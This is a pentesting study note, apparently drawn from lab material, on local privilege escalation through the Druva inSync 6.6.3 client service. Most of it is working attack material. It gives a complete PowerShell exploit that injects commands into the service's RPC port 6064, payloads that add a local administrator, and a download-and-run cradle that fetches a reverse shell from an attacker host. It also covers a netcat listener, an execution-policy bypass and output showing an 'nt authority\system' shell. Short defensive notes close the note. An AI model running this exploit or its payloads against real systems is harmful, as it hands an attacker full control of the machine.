---
title: Windows Privilege Escalation – Vulnerable Third-Party Software
aliases:
  - Vulnerable Third-Party Applications
  - Druva inSync Privilege Escalation
  - Druva inSync 6.6.3
  - inSyncCPHService
  - Third-Party Software LPE
tags:
  - windows
  - privilege-escalation
  - third-party-software
  - vulnerable-software
  - druva
  - druva-insync
  - command-injection
  - rpc
  - local-privilege-escalation
  - reverse-shell
  - system
  - pentesting
---

## Overview

Even well-patched and well-configured Windows systems can be vulnerable if users are allowed to install software or if vulnerable third-party applications are deployed across the organization.

Windows workstations often contain many vendor applications, background services, agents, VPN clients, backup tools, monitoring software, and endpoint utilities.

Some third-party services can allow escalation to:

```text
NT AUTHORITY\SYSTEM
```

Other vulnerable applications may expose:

- sensitive configuration files
- stored credentials
- denial-of-service conditions
- local command injection
- insecure RPC or localhost services
- weak service permissions

> [!important]
> Always enumerate installed software on Windows workstations and servers. Third-party applications are often a strong privilege escalation path.

---

# Why Third-Party Software Matters

Third-party applications frequently install Windows services that run as SYSTEM.

If the application exposes a vulnerable local interface, a low-privileged user may be able to abuse the service to execute commands in the service context.

Common risky patterns include:

- services listening on localhost
- unauthenticated local RPC interfaces
- command injection in service handlers
- weak ACLs on service binaries
- weak ACLs on service registry keys
- outdated vendor software
- backup or compliance agents running as SYSTEM

---

# Example Target – Druva inSync 6.6.3

The example vulnerable application is:

```text
Druva inSync 6.6.3
```

Druva inSync is backup, eDiscovery, and compliance monitoring software.

The vulnerable client service runs as:

```text
NT AUTHORITY\SYSTEM
```

Escalation is possible by interacting with a local service listening on:

```text
127.0.0.1:6064
```

The vulnerable component accepts RPC-style messages that can be abused for command injection.

---

# Method – Druva inSync Local Privilege Escalation

## Attack Flow

1. Enumerate installed applications.
2. Identify Druva inSync 6.6.3.
3. Confirm the vulnerable local service is listening on port `6064`.
4. Map the listening PID to the process.
5. Confirm the Druva inSync service is running.
6. Modify the PowerShell PoC command payload.
7. Host a PowerShell reverse shell script.
8. Start a listener.
9. Execute the PoC on the target.
10. Receive a SYSTEM shell.

---

# Step 1 – Enumerate Installed Programs

Use WMIC to list installed products.

```cmd
wmic product get name
```

Example output:

```cmd
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

Interesting finding:

```text
Druva inSync 6.6.3
```

This version is vulnerable to local command injection through an exposed RPC service.

> [!tip]
> When software stands out, search for the product name and exact version. Vendor agents and backup clients often have local privilege escalation history.

---

# Step 2 – Enumerate Local Ports

Check for the Druva inSync local service on port `6064`.

```cmd
netstat -ano | findstr 6064
```

Example output:

```cmd
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

Important listener:

```text
127.0.0.1:6064 LISTENING 3324
```

This confirms a service is listening locally on port `6064`.

---

# Step 3 – Map PID to Process

Map PID `3324` to the running process.

```powershell
Get-Process -Id 3324
```

Example output:

```powershell
PS C:\htb> Get-Process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

Process name:

```text
inSyncCPHwnet64
```

This matches the Druva inSync client service component.

---

# Step 4 – Confirm the Druva Service Is Running

Use `Get-Service` to confirm the running service.

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

Example output:

```powershell
PS C:\htb> Get-Service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

Service name:

```text
inSyncCPHService
```

Display name:

```text
Druva inSync Client Service
```

---

# Druva inSync PowerShell PoC

## Base PoC

The PoC opens a socket to the local RPC service and sends a crafted command string.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

## How It Works

The PoC connects to:

```text
127.0.0.1:6064
```

Then it sends a crafted RPC message containing a command path.

The command path uses traversal from the Druva directory into `System32`:

```text
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <command>
```

The vulnerable service executes the supplied command as the service account.

Expected context:

```text
NT AUTHORITY\SYSTEM
```

---

# Payload Option 1 – Add a Local User

Example: Create a Local Admin user and dump SAM/SYSTEM hashes.

The default PoC command creates a user:

```powershell
$cmd = "net user pwnd /add"
```

A noisier but direct local admin command would be:

```powershell
$cmd = "net user pwnd Pwnd1234! /add && net localgroup administrators pwnd /add"
```

> [!warning]
> Adding users is noisy and may be out of scope. Prefer a non-persistent proof-of-execution or a temporary callback when stealth and cleanup matter.

---

# Payload Option 2 – PowerShell Reverse Shell

## Prepare Reverse Shell Script

Use `Invoke-PowerShellTcp.ps1`.
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Rename it to something simple:

```text
shell.ps1
```

Append the callback line at the bottom of the script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Replace the IP and port with the attack host listener details.

---

# Modify the PoC Command

Modify the `$cmd` variable to download and execute the PowerShell reverse shell in memory.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

This causes the vulnerable service to execute:

```text
powershell
```

and load the remote script directly into memory.

> [!tip]
> This avoids writing the reverse shell script to disk on the target, but it still creates network and process telemetry.

---

# Start Python Web Server

Start an HTTP server from the directory containing `shell.ps1`.

```bash
python3 -m http.server 8080
```

Example:

```bash
Swordfish4051@htb[/htb]$ python3 -m http.server 8080
```

---

# Start Netcat Listener

Start a listener that matches the reverse shell port.

```bash
nc -lvnp 9443
```

Example:

```bash
Swordfish4051@htb[/htb]$ nc -lvnp 9443
```

---

# Execution Policy Bypass

If PowerShell script execution is restricted, bypass it for the current process.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

> [!note]
> This affects only the current PowerShell process scope.

---

# Execute the PoC

Run the modified PowerShell PoC on the target.

If successful, the reverse shell connects back to the listener.

Expected listener output:

```text
Swordfish4051@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>whoami

nt authority\system

PS C:\WINDOWS\system32>hostname

WINLPE-WS01
```

Successful indicators:

```text
nt authority\system
```

and:

```text
C:\WINDOWS\system32
```

---

# Practical Decision Tree

## Are third-party applications installed?

Enumerate:

```cmd
wmic product get name
```

Look for:

- backup clients
- VPN clients
- compliance agents
- endpoint utilities
- monitoring agents
- vendor services
- outdated versions

---

## Does a known vulnerable version exist?

Search the exact product and version.

Example:

```text
Druva inSync 6.6.3
```

Check whether the vulnerability requires:

- local access
- authenticated access
- a listening service
- a specific port
- a specific service version
- user interaction

---

## Is the vulnerable service listening?

Check local ports:

```cmd
netstat -ano | findstr <port>
```

For Druva:

```cmd
netstat -ano | findstr 6064
```

---

## What process owns the port?

Map PID to process:

```powershell
Get-Process -Id <pid>
```

For Druva example:

```powershell
Get-Process -Id 3324
```

---

## Is the service running?

Check service name and status:

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

---

## What payload is appropriate?

Choose based on rules of engagement:

| Payload Type | Notes |
|---|---|
| `whoami` proof | Low impact |
| file write proof | Useful for evidence |
| reverse shell | Interactive but noisy |
| add local admin | Persistent and noisy |
| custom command | Flexible |

---

# Troubleshooting

## Druva is installed but port 6064 is not listening

Possible causes:

- service is stopped
- different version
- service failed to start
- port changed
- local firewall or binding differs
- product component not installed

Check:

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

---

## PoC does not connect

Possible causes:

- service is not vulnerable
- wrong port
- service not running as expected
- command string is malformed
- PowerShell blocked
- endpoint protection blocks execution
- localhost connection blocked
- script syntax issue

---

## Reverse shell does not return

Check:

- listener is running
- callback IP is reachable
- callback port matches
- `shell.ps1` is hosted in the correct directory
- HTTP server is reachable from target
- outbound firewall permits connection
- payload is blocked by Defender or EDR

---

## PowerShell download cradle fails

Possible causes:

- PowerShell constrained language mode
- web request blocked
- proxy required
- AMSI blocks script content
- execution policy restrictions
- typo in URL
- listener IP mismatch

---

## Shell returns as machine account

Expected for a SYSTEM shell.

Example:

```text
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
```

The trailing `$` indicates the computer account. Confirm with:

```powershell
whoami
```

Expected:

```text
nt authority\system
```

---

# Command Reference

## Enumerate installed programs

```cmd
wmic product get name
```

## Check local listener on port 6064

```cmd
netstat -ano | findstr 6064
```

## Map PID to process

```powershell
Get-Process -Id <pid>
```

## Example PID lookup

```powershell
Get-Process -Id 3324
```

## Confirm Druva service

```powershell
Get-Service | ? {$_.DisplayName -like 'Druva*'}
```

## Bypass PowerShell execution policy for current process

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

## Reverse shell callback line

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

## Druva PoC command for reverse shell download cradle

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

## Start HTTP server

```bash
python3 -m http.server 8080
```

## Start listener

```bash
nc -lvnp 9443
```

## Confirm shell identity

```powershell
whoami
```

## Confirm hostname

```powershell
hostname
```

---

# Full Modified Druva PoC Template

```powershell
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)

$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

$s.Close()
```

---

# Cleanup Checklist

Remove staged files from the attack and target systems where applicable:

```text
shell.ps1
modified PoC script
temporary payloads
downloaded exploit files
logs or output files
```

If a user was created, remove it:

```cmd
net user <username> /delete
```

If any service or configuration was changed, restore it.

Document:

- vulnerable software name and version
- local listening port
- service name
- service account context
- exploit command used
- callback evidence
- cleanup actions completed

---

# Defensive Notes

## Risks

Allowing users to install software increases the chance of vulnerable local services appearing across the environment.

Third-party agents can be especially risky when they:

- run as SYSTEM
- expose localhost services
- accept unauthenticated RPC commands
- parse user-controlled input unsafely
- include outdated components
- are broadly deployed across endpoints

---

# Defensive Controls

Organizations should:

- restrict local administrator rights on workstations
- apply least privilege for software installation
- maintain an approved software inventory
- monitor installed software versions
- remove unsupported third-party applications
- patch vendor agents quickly
- restrict or monitor localhost management services
- use application control or allowlisting
- review services running as SYSTEM
- alert on suspicious PowerShell download cradles
- monitor unexpected outbound reverse shell-like traffic

---

# Key Takeaways

- Well-patched Windows systems can still be compromised through vulnerable third-party software.
- Installed application enumeration is essential during Windows privilege escalation.
- Druva inSync 6.6.3 exposes a vulnerable local RPC service on port `6064`.
- The Druva client service runs as SYSTEM, making command injection high impact.
- `netstat` can confirm the local listener.
- `Get-Process` can map the listener PID to the vulnerable process.
- `Get-Service` can confirm the Druva service status.
- The PowerShell PoC sends a crafted RPC message to execute commands through `cmd.exe`.
- A reverse shell payload can provide SYSTEM-level access.
- Organizations should restrict local software installation and use application allowlisting.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Third-Party Software]]
- [[Temporary Notes/Vulnerable Services]]
- [[Druva inSync]]
- [[Local Privilege Escalation]]
- [[Command Injection]]
- [[Windows Services]]
- [[PowerShell]]
- [[Reverse Shell]]
- [[Application Allowlisting]]
- [[Least Privilege]]

---

# Tags

#windows
#privilege-escalation
#third-party-software
#vulnerable-software
#druva
#druva-insync
#command-injection
#rpc
#localhost-service
#reverse-shell
#system
#powershell
#pentesting